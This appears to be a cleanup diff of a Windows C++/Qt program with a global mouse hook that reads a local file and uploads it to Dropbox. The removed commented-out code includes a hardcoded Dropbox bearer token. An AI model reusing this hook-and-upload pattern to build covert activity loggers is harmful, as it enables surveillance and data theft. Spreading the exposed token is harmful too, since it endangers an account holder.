@@ -13,16 +13,6 @@
 #include <QDebug>
 #include <QFile>
 #include "dropbox.h"
-
-//#include "sendfile.h"
-
-//#define CURL_STATICLIB
-#include <curl\curl.h>
-
-
-
-
-
 using namespace std;
 
 HHOOK mouseHook;
@@ -119,51 +109,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     //std::streambuf* sbuf = std::cout.rdbuf();
     //std::cout.rdbuf(file.rdbuf());
 
-    //cout << "attempting post" << endl;
-
-    /*CURL* curl;
-
-    curl = curl_easy_init();
-    curl_easy_cleanup(curl);*/
-
-    //QUrl url = QUrl("https://content.dropboxapi.com/2/files/upload");
-
-    /*QByteArray postData = "hello from qt";
-
-    QUrl url("https://content.dropboxapi.com/2/files/upload");
-    QNetworkRequest request(url);
-    request.setHeader(QNetworkRequest::ContentTypeHeader, "Authorization: Bearer 1v4q0_X7ptQAAAAAAAAAAXLkDScfpTbZWVk9TXX8Uy3DRsxRttFB34tQ41IGbEjl");
-    request.setHeader(QNetworkRequest::ContentTypeHeader, "Content-Type: application/octet-stream");
-    request.setHeader(QNetworkRequest::ContentTypeHeader, "Dropbox-API-Arg: {\"path\":\"/qthello.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}");
-
-
-    QNetworkAccessManager *mgr = new QNetworkAccessManager();*/
-
-    //QObject::connect(mgr, &QNetworkAccessManager::finished, printReply);
-
-
-    //postData.append(postKey).append("=").append(postValue).append("&");
-    //QNetworkReply *rep = mgr->post(request, postData);
-    //QString answer = QString::fromUtf8(rep->readAll());
-    //cout << answer.toStdString() << endl;
-
-
-    ///*connect(mgr, SIGNAL(finished(QNetworkReply*)), this, SLOT(onFinish(QNetworkReply*)));
-    //connect(mgr, SIGNAL(finished(QNetworkReply*)), mgr, SLOT(deleteLater()));*/
-
-    //QHttpMultiPart http;
-
-    //QHttpPart receiptPart;
-    //receiptPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"data\""));
-    //receiptPart.setBody("hello from Qt");
-
-    //http.append(receiptPart);
-
-    //mgr->post(QNetworkRequest(url), http);
-
-    /*DropBox* d = new DropBox();
-    d->upload("qtupload.txt");*/
-
     QNetworkAccessManager* mgr = new QNetworkAccessManager();
 
     QObject::connect(mgr, &QNetworkAccessManager::finished,
@@ -188,21 +133,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     file->open(QIODevice::ReadOnly);
     QByteArray content = file->readAll();
     qDebug() << content;
-    //request.setRawHeader(QByteArray("Content-Length:"), QByteArray::number(content.size()));
 
     QNetworkReply *reply = mgr->post(request, content);
 
-    //QObject::connect(reply, &QNetworkReply::finished, printReply);
-    
-
-   /*QObject::connect(reply,
-        &QNetworkReply::finished,
-        [=]() {
-            QString err = reply->errorString();
-            QString contents = QString::fromUtf8(reply->readAll());
-            qDebug() << "Error: " << err;
-            qDebug() << "contents: " << contents;
-       });*/
 
 
     //SetHook();
